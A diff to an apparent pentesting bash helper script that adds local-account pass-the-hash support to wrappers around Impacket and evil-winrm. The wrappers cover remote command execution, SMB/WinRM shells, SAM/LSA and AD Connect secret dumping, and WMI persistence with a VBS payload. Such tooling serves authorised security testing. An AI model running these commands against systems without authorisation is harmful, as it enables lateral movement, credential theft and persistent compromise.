@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# DESCRIPTION: This script contains bash helper functions for basic pentesting tasks. See the requirements section.
+# DESCRIPTION: This script contains bash helper functions for basic pentesting tasks with local and domain PTH.
 
 # SECTION: Required dependencies:
 # DESCRIPTION: Required github repositories used in helper functions.
@@ -82,6 +82,58 @@ function setVariables(){
     export DOMAINUSER="${DOMAIN}/${USER}";
     export HASH=`encodeHash ${PASSWORD}`;
     export HASHES=":${HASH}";
+    return;
+}
+
+function setUserByPassword(){
+    # DESCRIPTION: Set current domain user by password.
+    # ARGUMENT: USER, DOMAIN, PASSWORD.
+    export USER=$1;
+    export DOMAIN=$2;
+    export PASSWORD=$3;
+    export DCIP=$2;
+    setVariables;
+    return;
+}
+
+function setLocalUserByPassword(){
+    # DESCRIPTION: Set current local user by password.
+    # ARGUMENT: USER, PASSWORD, TARGET.
+    export USER=$1;
+    export PASSWORD=$2;
+    export TARGET=$3;
+    setVariables;
+    export DOMAINUSER=$USER;
+    export DOMAIN="";
+    export DCIP="";
+    return;
+}
+
+function setUserByHash(){
+    # DESCRIPTION: Set current domain user by hash.
+    # ARGUMENT: USER, DOMAIN, HASH.
+    export USER=$1;
+    export DOMAIN=$2;
+    setVariables;
+    export HASH=$3;
+    export HASHES=":${HASH}";
+    export PASSWORD=$HASHES;
+    export DCIP=$2;
+    return;
+}
+
+function setLocalUserByHash(){
+    # DESCRIPTION: Set current local user by hash.
+    # ARGUMENT: USER, HASH, TARGET.
+    export USER=$1;
+    export TARGET=$3;
+    setVariables;
+    export DOMAINUSER=$USER;
+    export HASH=$2;
+    export HASHES=":${HASH}";
+    export PASSWORD=$HASHES;
+    export DOMAIN="";
+    export DCIP="";
     return;
 }
 
@@ -234,10 +286,18 @@ function checkLocalAdmin(){
     # DESCRIPTION: Check target for local admin privileges.
     # ARGUMENT: TARGET.
     TARGET=$1;
-    proxychains \
-    pywerview invoke-checklocaladminaccess \
-    -w $DOMAIN -u $USER \
-    --hashes $HASHES --computername "${TARGET}";
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            pywerview invoke-checklocaladminaccess \
+            -w $TARGET -u $USER \
+            --hashes $HASHES --computername "${TARGET}";
+    else
+          proxychains \
+            pywerview invoke-checklocaladminaccess \
+            -w $DOMAIN -u $USER \
+            --hashes $HASHES --computername "${TARGET}";
+    fi
     return;
 }
 
@@ -260,11 +320,20 @@ function wmiSurvey(){
     select Antecedent from Win32_LoggedOnUser;
     exit
     " > /tmp/query.wql;
-    proxychains \
-    wmiquery.py \
-    -no-pass -hashes $HASHES \
-    -file /tmp/query.wql \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            wmiquery.py \
+            -no-pass -hashes $HASHES \
+            -file /tmp/query.wql \
+            ${USER}@${TARGET};
+    else
+          proxychains \
+            wmiquery.py \
+            -no-pass -hashes $HASHES \
+            -file /tmp/query.wql \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    fi
     rm /tmp/query.wql;
     return;
 }
@@ -273,10 +342,18 @@ function wmiQuery(){
     # DESCRIPTION: Run WMI query on remote target.
     # ARGUMENT: TARGET.
     TARGET=$1;
-    proxychains \
-    wmiquery.py \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            wmiquery.py \
+            -no-pass -hashes $HASHES \
+            ${USER}@${TARGET};
+    else
+          proxychains \
+            wmiquery.py \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    fi
     return;
 }
 
@@ -285,11 +362,20 @@ function registryQuery(){
     # ARGUMENT: TARGET, QUERY.
     TARGET=$1;
     QUERY=$2;
-    proxychains \
-    reg.py \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET} \
-    query -keyName $QUERY -s;
+    if [[ -z "$DOMAIN" ]]
+    then
+        proxychains \
+        reg.py \
+        -no-pass -hashes $HASHES \
+        ${USER}@${TARGET} \
+        query -keyName $QUERY -s;
+    else
+        proxychains \
+        reg.py \
+        -no-pass -hashes $HASHES \
+        -dc-ip $DCIP ${DOMAINUSER}@${TARGET} \
+        query -keyName $QUERY -s;
+    fi
     return;
 }
 
@@ -297,10 +383,18 @@ function serviceQuery(){
     # DESCRIPTION: Run service query on remote target.
     # ARGUMENT: TARGET.
     TARGET=$1;
-    proxychains \
-    services.py \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET} list;
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            services.py \
+            -no-pass -hashes $HASHES \
+            ${USER}@${TARGET} list;
+    else
+          proxychains \
+            services.py \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} list;
+    fi
     return;
 }
 
@@ -513,10 +607,18 @@ function winRMShell(){
     # DESCRIPTION: WinRM/PSRP shell on target system.
     # ARGUMENT: TARGET.
     TARGET=$1;
-    proxychains \
-    evil-winrm -i $TARGET \
-    -u "${DOMAIN}\\${USER}" -H $HASH \
-    -s ./ -e ./ -P 5985;
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            evil-winrm -i $TARGET \
+            -u $USER -H $HASH \
+            -s ./ -e ./ -P 5985;
+    else
+          proxychains \
+            evil-winrm -i $TARGET \
+            -u "${DOMAIN}\\${USER}" -H $HASH \
+            -s ./ -e ./ -P 5985;
+    fi
     return;
 }
 
@@ -535,11 +637,20 @@ function smbShell(){
     # DESCRIPTION: SMB shell on target system.
     # ARGUMENT: TARGET.
     TARGET=$1;
-    proxychains \
-    smbexec.py \
-    -no-pass -hashes $HASHES \
-    -service-name Win32SCCM \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            smbexec.py \
+            -no-pass -hashes $HASHES \
+            -service-name Win32SCCM \
+            ${USER}@${TARGET};
+    else
+          proxychains \
+            smbexec.py \
+            -no-pass -hashes $HASHES \
+            -service-name Win32SCCM \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    fi
     return;
 }
 
@@ -548,11 +659,20 @@ function wmiCommand(){
     # ARGUMENT: TARGET, COMMAND.
     TARGET=$1;
     COMMAND=$2;
-    proxychains \
-    wmiexec.py \
-    -nooutput \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            wmiexec.py \
+            -nooutput \
+            -no-pass -hashes $HASHES \
+            ${USER}@${TARGET} "${COMMAND}";
+    else
+          proxychains \
+            wmiexec.py \
+            -nooutput \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
+    fi
     return;
 }
 
@@ -561,10 +681,18 @@ function psexecCommand(){
     # ARGUMENT: TARGET, COMMAND.
     TARGET=$1;
     COMMAND=$2;
-    proxychains \
-    psexec.py \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            psexec.py \
+            -no-pass -hashes $HASHES \
+            ${USER}@${TARGET} "${COMMAND}";
+    else
+        proxychains \
+            psexec.py \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
+    fi
     return;
 }
 
@@ -573,10 +701,18 @@ function atCommand(){
     # ARGUMENT: TARGET, COMMAND.
     TARGET=$1;
     COMMAND=$2;
-    proxychains \
-    atexec.py \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            atexec.py \
+            -no-pass -hashes $HASHES \
+            ${USER}@${TARGET} "${COMMAND}";
+    else
+          proxychains \
+            atexec.py \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
+    fi
     return;
 }
 
@@ -585,11 +721,20 @@ function dcomCommand(){
     # ARGUMENT: TARGET, COMMAND.
     TARGET=$1;
     COMMAND=$2;
-    proxychains \
-    dcomexec.py \
-    -nooutput \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            dcomexec.py \
+            -nooutput \
+            -no-pass -hashes $HASHES \
+            ${USER}@${TARGET} "${COMMAND}";
+    else
+          proxychains \
+            dcomexec.py \
+            -nooutput \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} "${COMMAND}";
+    fi
     return;
 }
 
@@ -623,11 +768,19 @@ function mssqlConnect(){
     TARGET=$1;
     DB=$2
     PORT=$3;
-    proxychains \
-    mssqlclient.py \
-    -windows-auth -port $PORT -db $DB \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            mssqlclient.py \
+            -port $PORT -db $DB \
+            ${USER}:${PASSWORD}@${TARGET};
+    else
+          proxychains \
+            mssqlclient.py \
+            -windows-auth -port $PORT -db $DB \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    fi
     return;
 }
 
@@ -635,10 +788,18 @@ function smbConnect(){
     # DESCRIPTION: Connect to remote SMB share.
     # ARGUMENT: TARGET.
     TARGET=$1;
-    proxychains \
-    smbclient.py \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            smbclient.py \
+            -no-pass -hashes $HASHES \
+            ${USER}@${TARGET};
+    else
+          proxychains \
+            smbclient.py \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    fi
     return;
 }
 
@@ -663,7 +824,7 @@ function smbServer(){
     # ARGUMENT: IPADDRESS.
     IPADDRESS=$1;
     smbserver.py -ip $IPADDRESS \
-    -port 445 -smb2support PWN ./ ;
+        -port 445 -smb2support PWN ./ ;
     return;
 }
 
@@ -684,11 +845,20 @@ function dumpADConnect(){
     # DESCRIPTION: Dump AD Sync credentials on remote target.
     # ARGUMENT: TARGET.
     TARGET=$1;
-    proxychains \
-    python /opt/adconnectdump/adconnectdump.py \
-    -outputfile $TARGET \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            python /opt/adconnectdump/adconnectdump.py \
+            -outputfile $TARGET \
+            -no-pass -hashes $HASHES \
+            ${USER}@${TARGET};
+    else
+          proxychains \
+            python /opt/adconnectdump/adconnectdump.py \
+            -outputfile $TARGET \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    fi
     return;
 }
 
@@ -696,11 +866,20 @@ function dumpSAM(){
     # DESCRIPTION: Dump SAM and LSA secrets on remote host.
     # ARGUMENT: TARGET.
     TARGET=$1;
-    proxychains \
-    secretsdump.py \
-    -outputfile $TARGET \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            secretsdump.py \
+            -outputfile $TARGET \
+            -no-pass -hashes $HASHES \
+            ${USER}@${TARGET};
+    else
+          proxychains \
+            secretsdump.py \
+            -outputfile $TARGET \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET};
+    fi
     return;
 }
 
@@ -709,12 +888,22 @@ function wmiPersist(){
     # ARGUMENT: TARGET, PAYLOAD.
     TARGET=$1;
     PAYLOAD=$2;
-    proxychains \
-    wmipersist.py \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET} \
-    install -name PWN \
-    -vbs $PAYLOAD -timer 120000;
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            wmipersist.py \
+            -no-pass -hashes $HASHES \
+            ${USER}@${TARGET} \
+            install -name PWN \
+            -vbs $PAYLOAD -timer 120000;
+    else
+          proxychains \
+            wmipersist.py \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} \
+            install -name PWN \
+            -vbs $PAYLOAD -timer 120000;
+    fi
     return;
 }
 
@@ -722,11 +911,20 @@ function removeWmiPersist(){
     # DESCRIPTION: Remove WMI persistence on remote target.
     # ARGUMENT: TARGET.
     TARGET=$1;
-    proxychains \
-    wmipersist.py \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP ${DOMAINUSER}@${TARGET} \
-    remove -name PWN;
+    if [[ -z "$DOMAIN" ]]
+    then
+          proxychains \
+            wmipersist.py \
+            -no-pass -hashes $HASHES \
+            ${USER}@${TARGET} \
+            remove -name PWN;
+    else
+          proxychains \
+            wmipersist.py \
+            -no-pass -hashes $HASHES \
+            -dc-ip $DCIP ${DOMAINUSER}@${TARGET} \
+            remove -name PWN;
+    fi
     return;
 }
 
@@ -806,10 +1004,10 @@ function getST(){
     SPN=$1;
     TARGET=$2;
     proxychains \
-    getST.py -spn $SPN \
-    -impersonate $TARGET \
-    -no-pass -hashes $HASHES \
-    -dc-ip $DCIP $DOMAINUSER;
+        getST.py -spn $SPN \
+        -impersonate $TARGET \
+        -no-pass -hashes $HASHES \
+        -dc-ip $DCIP $DOMAINUSER;
     return;
 }
 
